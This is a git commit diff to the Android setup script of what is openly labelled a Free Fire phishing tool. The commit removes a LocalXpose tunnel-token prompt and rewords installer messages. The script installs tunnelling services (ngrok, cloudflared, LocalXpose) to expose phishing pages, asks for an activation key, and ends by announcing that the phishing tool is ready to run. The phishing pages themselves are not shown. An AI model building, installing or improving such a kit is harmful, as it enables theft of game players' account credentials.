26ab6a9860ce0f4c3ac21cd7de48bb4557f2b8c7
SUMAM MONDAL <63942767+Online-Hacking@users.noreply.github.com>
2022-11-26 21:30:02 +0530

    Update Android-Setup.sh

--- OnlineHacking/SUMAN/FreeFire/SM/Files/Android-Setup.sh
+++ OnlineHacking/SUMAN/FreeFire/SM/Files/Android-Setup.sh
@@ -168,66 +168,6 @@ clear
 fi
 }
 
-localtoken() {
-echo ""
-echo -e "\e[93m 
-
-██       ██████   ██████  █████  ██      
-██      ██    ██ ██      ██   ██ ██      
-██      ██    ██ ██      ███████ ██      
-██      ██    ██ ██      ██   ██ ██      
-███████  ██████   ██████ ██   ██ ███████                                          
- \e[92m                                        
-██   ██ ██████   ██████  ███████ ███████ 
- ██ ██  ██   ██ ██    ██ ██      ██      
-  ███   ██████  ██    ██ ███████ █████   
- ██ ██  ██      ██    ██      ██ ██      
-██   ██ ██       ██████  ███████ ███████ 
-                                                                   
-\e[0m\n"
-echo ""
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mLocalXpose \e[32mAccess Token ? \e[1;91m (y/n) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
-clear
-localxpose_auth
-echo ""
-fi
-if [[ $option == *'n'* ]]; then
-clear
-fi
-}
-
-localxpose_auth() {
-	./loclx -help > /dev/null 2>&1 &
-	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
-
-	[ "$(./loclx account status | grep Error)" ] && {
-	        echo ""
-                echo " "
-		echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-                echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!      Requirement Localxpose Token    !!\e[0m'
-                echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
-                echo ""
-                echo " "
-                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Visit \e[92mlocalxpose.io \e[m "
-                echo ""
-                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Create an account on & Click Access Button & Copy Access Token \e[m "
-                echo ""
-		sleep 3
-		read -p $'\e[91m[\e[92m*\e[91m]\e[93m Input Loclx Token :\e[97m ' loclx_token
-		[[ $loclx_token == "" ]] && {
-			echo -e "\e[91m[\e[92m!\e[91m]\e[93m  You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
-		} || {
-			echo -n "$loclx_token" > $auth_f 2> /dev/null
-		}
-	}
-}
 
 uninstall() {
 echo -e ""
@@ -252,10 +192,10 @@ echo ""
 echo ""
 echo ""
 echo ""
-echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install successfully \e[0m"
 echo ""
 echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Setup Tool Installation Video  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
@@ -275,7 +215,7 @@ echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to O
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
 echo ""
 echo -e ""
-echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m If You are not Understand. Play Installation Video \e[0m"
 echo ""
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://www.hacktube.xyz/v/  "
 echo ""
@@ -386,8 +326,6 @@ chmod +x FreeFire
 clear
 
 ngroktoken
-clear
-localtoken
 
 echo
 cp -R cloudflared ngrok loclx .SUMAN/1/
@@ -427,12 +365,12 @@ echo
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
-sleep 4
+sleep 2
 echo
-echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Ready \e[m \e[21"
+echo -e "\e[1m \e[36m[+] There Free Fire Max Phishing Tool Ready \e[m \e[21"
 echo
 echo
-echo -e "\e[92m[+] Open New type this command:\e[93m FreeFire-Phishing \e[m "
+echo -e "\e[92m[+] Now Type This Command:\e[93m FreeFire-Phishing \e[m "
 echo
 fi
 
